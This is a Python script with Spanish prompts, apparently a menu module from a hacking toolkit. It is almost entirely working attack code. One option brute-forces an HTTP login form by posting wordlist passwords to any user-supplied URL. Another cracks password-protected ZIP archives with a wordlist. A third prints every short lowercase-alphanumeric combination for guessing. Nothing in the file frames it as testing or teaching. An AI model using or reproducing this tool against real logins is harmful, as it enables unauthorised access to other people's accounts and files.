import requests
import itertools
import string
from colorama import Fore

def bruteforce_menu():
    print(f"""
{Fore.YELLOW}1. Brute force a login HTTP POST
2. Brute force ZIP con wordlist
3. Generador de combinaciones""")
    op = input("Opción: ")
    
    if op == "1":
        url = input("URL de login: ")
        user = input("Usuario: ")
        wordlist = input("Wordlist de passwords: ")
        with open(wordlist, "r", encoding='latin-1') as f:
            for pwd in f:
                pwd = pwd.strip()
                data = {"username": user, "password": pwd}
                try:
                    r = requests.post(url, data=data, timeout=2)
                    if "Login exitoso" in r.text or r.status_code == 200:
                        print(f"{Fore.GREEN}[+] Password encontrado: {pwd}")
                        break
                except:
                    pass
    elif op == "2":
        zip_file = input("ZIP file: ")
        wordlist = input("Wordlist: ")
        import zipfile
        with open(wordlist, "r", encoding='latin-1') as f:
            for pwd in f:
                pwd = pwd.strip()
                try:
                    with zipfile.ZipFile(zip_file) as zf:
                        zf.extractall(pwd=pwd.encode())
                        print(f"{Fore.GREEN}[+] Password: {pwd}")
                        break
                except:
                    pass
    elif op == "3":
        chars = string.ascii_lowercase + string.digits
        for length in range(1, 5):
            for combo in itertools.product(chars, repeat=length):
                print(''.join(combo))
    input("Enter...")
